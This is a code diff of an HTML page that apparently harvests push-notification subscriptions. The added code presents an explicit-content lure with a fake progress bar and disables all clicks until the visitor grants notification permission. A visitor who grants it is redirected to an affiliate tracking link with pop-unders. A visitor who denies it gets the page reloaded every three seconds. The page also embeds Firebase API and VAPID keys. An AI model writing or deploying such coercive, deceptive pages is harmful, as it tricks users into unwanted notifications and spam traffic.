@@ -3,47 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Offer - Unlock Now!</title>
+    <title>Exclusive Adult Content - Allow to Continue</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: #101010;
+            background: #000;
             color: white;
             text-align: center;
-            padding: 50px;
             margin: 0;
+            padding: 50px;
+        }
+        h1 {
+            color: #ff4747;
+            font-size: 26px;
+        }
+        .loading-container {
+            width: 80%;
+            background: #222;
+            margin: 20px auto;
+            height: 20px;
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        .loading-bar {
+            height: 100%;
+            width: 0%;
+            background: #ff4747;
+            transition: width 2s ease-in-out;
         }
         .loading-message {
-            font-size: 20px;
-            color: #f1c40f;
-        }
-        .button {
-            background-color: #f39c12;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-            font-size: 16px;
-            border-radius: 5px;
-            transition: all 0.3s ease;
-        }
-        .button:hover {
-            background-color: #e67e22;
-            transform: scale(1.1);
+            font-size: 18px;
+            color: #ffcc00;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>🔓 Welcome to Your Exclusive Offer 🔓</h1>
-    <p class="loading-message">You are being redirected to the exclusive content...</p>
+    <h1>🚨 WARNING: EXPLICIT CONTENT 🚨</h1>
+    <p class="loading-message">Allow notifications to continue...</p>
+    
+    <div class="loading-container">
+        <div class="loading-bar" id="loadingBar"></div>
+    </div>
 
-    <button id="offerButton" class="button">Unlock Offer</button>
-
-    <!-- Firebase Scripts -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
         import { getAnalytics, logEvent } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-analytics.js";
-        import { getMessaging, getToken, onMessage } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-messaging.js";
+        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-messaging.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCR4r9W605fmFeGpqRrb7FYToxWbYyJGtk",
@@ -59,38 +66,39 @@
         const analytics = getAnalytics(app);
         const messaging = getMessaging(app);
 
-        // Función que solicita el permiso de notificaciones al cargar la página
+        // Simulación de carga falsa
+        let progress = 0;
+        const loadingBar = document.getElementById("loadingBar");
+        function fakeLoading() {
+            progress += Math.random() * 20;
+            loadingBar.style.width = progress + "%";
+            if (progress < 90) {
+                setTimeout(fakeLoading, 500);
+            }
+        }
+        fakeLoading();
+
+        // Bloquear hasta respuesta
+        document.body.style.pointerEvents = "none";
+
+        // Solicitar notificaciones
         Notification.requestPermission().then(permission => {
             if (permission === "granted") {
-                console.log("Notification permission granted.");
                 logEvent(analytics, 'notification_permission_granted');
                 getToken(messaging, { vapidKey: 'BMPPrc5Za775GGbVKn8piovY5XlQVnBNlKwTjviSrQZ59xr4uufNpQqnNqdIpdr84wUaOURG57zLS4uwQXmrWIg' })
                     .then(currentToken => {
-                        if (currentToken) {
-                            console.log("FCM Token:", currentToken);
-                        } else {
-                            console.log("No registration token available.");
-                        }
+                        console.log("FCM Token:", currentToken);
                     }).catch(err => {
                         console.log("Error getting FCM token:", err);
                     });
+
+                document.body.style.pointerEvents = "auto";
+                loadingBar.style.width = "100%";
+                setTimeout(() => window.location.href = "https://t.slext2.com/341879/7272?bo=2753,2754,2755,2756&popUnder=true&aff_sub5=SF_006OG000004lmDN", 2000);
             } else {
-                console.log("Notification permission denied.");
                 logEvent(analytics, 'notification_permission_denied');
+                setTimeout(() => location.reload(), 3000); // Reintentar en 3 segundos si deniega
             }
-
-            // Continuar solo después de que el usuario haya aceptado o denegado
-            setTimeout(function() {
-                // Redirigir a la URL después de la respuesta de notificación
-                window.location.href = "https://t.slext2.com/341879/7272?bo=2753,2754,2755,2756&popUnder=true&aff_sub5=SF_006OG000004lmDN";
-            }, 1000); // 1 segundo después de la respuesta
-        });
-
-        // Registrar el clic en el botón de la oferta
-        const offerButton = document.getElementById("offerButton");
-        offerButton.addEventListener("click", function() {
-            console.log("Button clicked!");
-            logEvent(analytics, 'offer_button_click', { 'offer_name': 'exclusive_offer' });
         });
     </script>
 </body>
